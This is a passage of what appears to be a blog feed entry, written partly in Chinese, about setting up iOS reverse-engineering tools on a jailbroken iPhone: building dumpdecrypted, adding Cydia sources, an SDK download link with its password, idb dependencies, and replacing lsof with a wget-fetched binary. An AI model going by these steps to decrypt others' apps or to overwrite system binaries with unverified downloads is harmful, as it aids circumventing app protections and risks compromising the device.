+<h4 id="dumpdecrypted-1"><a href="#dumpdecrypted-1" class="headerlink" title="dumpdecrypted"></a>dumpdecrypted</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; git clone https://github.com/stefanesser/dumpdecrypted</span><br><span class="line">&gt; cd dumpdecrypted &amp;&amp; make</span><br><span class="line">&gt; scp dumpdecrypted.dylib root@&lt;ip&gt;:/Applications/iRE.app</span><br></pre></td></tr></table></figure>
+<p>添加源</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://coredev.nl/cydia/</span><br><span class="line">http://nix.howett.net/theos/</span><br></pre></td></tr></table></figure>
+<h4 id="theos"><a href="#theos" class="headerlink" title="theos"></a>theos</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IOS8.1 SDK 链接: http://pan.baidu.com/s/1kUOKYUz3 密码: cmcr</span><br></pre></td></tr></table></figure>
+<h3 id="idb"><a href="#idb" class="headerlink" title="idb"></a><a href="https://github.com/dmayer/idb" target="_blank" rel="external">idb</a></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; brew install qt cmake usbmuxd libimobiledevice</span><br></pre></td></tr></table></figure>
+<h3 id="fix-Cydia-install-lsof"><a href="#fix-Cydia-install-lsof" class="headerlink" title="fix Cydia install lsof"></a>fix Cydia install lsof</h3><blockquote>
+<p>download <a href="https://github.com/sunkehappy/iOS-reverse-engineering-tools-backup/blob/master/lsof-arm7-iOS4.2" target="_blank" rel="external">lsof-arm7-iOS4.2</a></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iPhone5S:~ root# mv /usr/bin/lsof /usr/bin/lsof-backup</span><br><span class="line">iPhone5S:~ root# wget https://github.com/sunkehappy/iOS-reverse-engineering-tools-backup/blob/master/lsof-arm7-iOS4.2?raw=true -O /usr/bin/lsof</span><br><span class="line">iPhone5S:~ root# chmod +x /usr/bin/lsof</span><br></pre></td></tr></table></figure>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;Tools&quot;&gt;&lt;a href=&quot;#Tools&quot; class=&quot;headerlink&quot; title=&quot;Tools&quot;&gt;&lt;/a&gt;Tools&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;
+    
+    </summary>
+    
+    
+      <category term="ios" scheme="http://blog.safebuff.com/tags/ios/"/>
+    
+  </entry>
+  
+</feed>
